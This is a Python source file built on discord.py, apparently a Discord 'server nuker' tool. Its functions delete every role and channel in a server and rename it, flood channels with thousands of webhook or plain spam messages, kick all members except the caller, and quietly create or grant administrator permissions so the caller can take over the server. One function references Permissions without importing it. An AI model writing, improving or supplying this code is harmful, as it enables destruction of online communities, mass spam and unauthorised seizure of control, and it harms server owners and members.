import discord
from discord.ext import commands
import asyncio


async def crash(ctx, crashname, rolereason, chreasone, channelname, rolename, numberchann: int, numberole: int):
        guild = ctx.message.guild     
        await guild.edit(name=crashname)

        await ctx.message.delete()

        for m in ctx.guild.roles:
            try:
                await m.delete(reason=rolereason)
            except:
                pass

        for channel in ctx.guild.channels:
                try:
                        await channel.delete(reason=chreasone)
                except:
                        pass


        for _ in range(numberchann):
            await guild.create_text_channel(channelname)

        for _ in range(numberole):
          await guild.create_role(name=rolename)


async def channel_spam(channel, webhookname, contentmsgwebhook, embedmsgwebhook):
    try:
        webhook = await channel.create_webhook(name=webhookname)
        for _ in range(5000):
          await webhook.send(content=contentmsgwebhook, embed=discord.Embed(title=embedmsgwebhook))
    except:
       for _ in range(5000):
         await channel.send(content=contentmsgwebhook, embed=discord.Embed(title=embedmsgwebhook))


async def spam(ctx, textspam, nummsg: int):
    for i in range(nummsg):
        await ctx.send(textspam)


async def admever(ctx):
  role = discord.utils.get(ctx.guild.roles, name = "@everyone")
  await role.edit(permissions = Permissions.administrator())




async def kickeveryone(ctx, reasonkick, textauthor, guildtext):
    kicked = 0
    nokicked = 0
    await ctx.message.delete()
    for janek in ctx.guild.members:
        if int(janek.id) != int(ctx.message.author.id):
            try:
                await ctx.guild.kick(janek, reason=reasonkick)
                kicked +=1
            except:
                nokicked +=1

    try:
        await ctx.author.send(textauthor)
    except:
        await ctx.send(guildtext)



async def adm(ctx, rolename, text):
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) 
    await guild.create_role(name=rolename, permissions=perms) 
    
    role = discord.utils.get(ctx.guild.roles, name=rolename) 
    user = ctx.message.author 
    await user.add_roles(role) 
    await ctx.message.delete()
    await ctx.author.send(text)